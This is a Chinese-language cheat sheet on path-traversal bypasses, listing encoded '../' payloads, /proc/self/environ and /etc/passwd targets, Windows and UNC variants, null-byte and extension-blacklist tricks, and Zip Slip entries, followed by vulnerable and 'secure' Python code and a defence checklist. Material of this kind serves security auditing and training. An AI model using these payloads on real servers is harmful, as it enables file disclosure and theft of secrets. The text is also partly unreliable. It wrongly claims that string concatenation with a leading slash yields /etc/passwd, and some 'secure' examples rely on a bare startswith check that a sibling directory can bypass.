# 路径遍历绕过秘笈

## 目录遍历编码

```
../                      # 基础遍历
..%2f                   # /的URL编码
..%5c                   # \的URL编码（Windows）
%2e%2e%2f              # ../完全URL编码
..%252f                # 双URL编码
....//                 # 替换后绕过（....// → ..// 后执行）
```

## 特殊路径利用

### 符号链接绕过检查
```
// 符号链接可指向受限目录外的敏感文件
// 访问前未检查是否为符号链接导致漏洞
/uploads/link -> /etc/passwd
```

### /proc 绕过检查和信息泄露
```
/proc/self/environ                 // 密钥、配置
/proc/self/cmdline                 // 命令行参数
/proc/self/maps                    // 内存映射（ASLR绕过）
/proc/net/tcp                      // TCP连接
/proc/self/root/../../../../etc/passwd  // 符号链接结合遍历
```

## 平台特定绕过

### Windows路径差异
```
../                      # Unix风格斜杠
..\\                     # Windows反斜杠
..%5c                    # 反斜杠URL编码
C:\Windows\System32\     # 绝对路径
//server/share/          # UNC路径
```

### 前导斜杠绕过
```
base_path = "/var/www/uploads"
user_input = "/etc/passwd"
result = base_path + user_input  # 结果：/etc/passwd（斜杠覆盖）
```

### 混合路径分隔符
```
..%2f..%5c..%2fetc%2fpasswd       # 混合 / 和 \ 编码
```

## 文件扩展名操纵

### Null Byte截断（PHP < 5.3.4）
```
file.php%00.txt         # 结果：file.php
../../../etc/passwd%00  # 截断后缀
```

### 黑名单绕过
```
file.phtml              # 可执行扩展名
file.php5、file.php7    # 版本特定扩展
file.PhP                # 大小写混淆
file.php.txt            # 双扩展名（某些配置执行）
.phtml、.shtml          # 其他可执行扩展
```

## 归档解压 (Zip Slip)

### ZIP文件路径遍历
```
malicious.zip包含：
  ../../etc/passwd       # 解压时覆盖系统文件
  ../../../app/config.php
```

### TAR文件路径遍历
```
tar -xf archive.tar     # 未验证目标路径
包含：../../etc/passwd
```

## 代码示例

### 危险代码示例
```python
# 危险：直接拼接，未验证
base = "/var/www/uploads"
user_file = request.args.get('file')
path = base + user_file  # 攻击：/var/www/uploads/../../../etc/passwd
open(path).read()

# 危险：仅过滤 ../，未覆盖所有编码
path = user_file.replace("../", "")  # 攻击：....//....//etc/passwd
open(path).read()

# 危险：未验证根目录
from pathlib import Path
path = Path(user_file).resolve()  # 仍可访问任意文件
open(path).read()
```

### 安全代码示例
```python
# 安全：使用白名单
ALLOWED_FILES = {'file1.txt', 'file2.pdf'}
user_file = request.args.get('file')
if user_file not in ALLOWED_FILES:
    abort(403)
open(user_file).read()

# 安全：验证规范化路径在基础目录内
from pathlib import Path
base = Path('/var/www/uploads').resolve()
user_file = request.args.get('file')
path = (base / user_file).resolve()  # 规范化
if not str(path).startswith(str(base)):  # 验证基础目录
    abort(403)
open(path).read()

# 安全：使用库的安全函数
import os
base = '/var/www/uploads'
user_file = request.args.get('file')
safe_path = os.path.normpath(os.path.join(base, user_file))
if not safe_path.startswith(os.path.normpath(base)):
    abort(403)
open(safe_path).read()
```

## 快速定位

**关键词**：
- 字符串拼接：`base + user_input`、`base + "/" + user_input`
- 路径函数：`path.join`、`os.path.join`、`Paths.get`
- 文件操作：`open`、`fopen`、`readFile`、`send_file`
- 缺乏验证：无 `startswith` / `in ALLOWED` / `resolve` 后的检查

**测试顺序**：
1. 基础遍历：`../../../etc/passwd`
2. URL编码：`%2e%2e%2fetc%2fpasswd`
3. 双重编码：`%252e%252e%252fetc%252fpasswd`
4. 平台特定：`..%5c..%5cetc%5cpasswd`（Windows）
5. 符号链接：验证是否可访问符号链接指向的文件
6. 绝对路径：`/etc/passwd`、`C:\Windows\System32\`

## 防御检查清单

- 使用白名单验证文件名或路径
- 规范化路径后验证是否在基础目录内
- 避免字符串拼接，使用 `path.join` 等安全函数
- 使用 `realpath()`/`resolve()` 获取规范化路径
- 禁用符号链接或检测后拒绝
- 验证文件扩展名和MIME类型（不作为唯一防护）
- 避免使用用户输入作为绝对路径前缀
- 定期审计文件操作相关的代码
